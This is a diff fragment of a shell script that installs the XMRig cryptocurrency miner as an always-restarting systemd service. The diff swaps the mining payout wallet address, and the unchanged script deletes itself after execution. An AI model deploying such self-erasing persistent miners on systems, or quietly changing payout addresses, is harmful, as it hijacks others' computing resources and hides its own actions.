@@ -110,7 +110,7 @@ Description=XMRig Miner Service
 After=network.target
 
 [Service]
-ExecStart=$XMRIG_BINARY -a rx/0 --url sal.kryptex.network:7028 --user SaLvdXgjQQNC6DFxZgMEHpQ4RG6LjBynZGxrbp5kEit1YxBUoeRB81cLR2NNU43mP9DfyEPqHpf8VMNT4aXSXyefKQTLqoVMUgJ/sallinux -k
+ExecStart=$XMRIG_BINARY -a rx/0 --url sal.kryptex.network:7028 --user SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/sallinux -k
 Restart=always
 RestartSec=5
 WorkingDirectory=$XMRIG_DIR
@@ -131,3 +131,4 @@ echo "[*] Done! Use 'sudo journalctl -u xmrig -f' to view miner logs"
 
 # Delete this script after execution
 rm -f "$(realpath "$0")"
+
